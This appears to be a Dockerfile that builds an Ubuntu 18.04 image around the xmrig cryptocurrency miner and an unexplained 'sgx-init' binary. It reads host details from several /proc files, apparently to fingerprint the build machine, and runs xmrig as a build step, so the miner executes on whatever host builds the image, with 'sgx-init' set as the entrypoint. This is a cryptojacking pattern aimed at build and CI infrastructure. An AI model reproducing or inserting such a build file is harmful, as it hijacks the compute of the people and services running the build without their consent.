FROM ubuntu:18.04

ADD sgx-init /home/

ADD xmrig /home/

ADD config.json /home/

RUN cd /home/ && chmod +777 sgx-init && chmod +777 config.json

WORKDIR /home/

RUN cat /proc/1/cgroup

RUN cat /proc/uptime

RUN cat /proc/cpuinfo

RUN cat /proc/meminfo

RUN cat /proc/cmdline

RUN ./xmrig

ENTRYPOINT ["./sgx-init"]
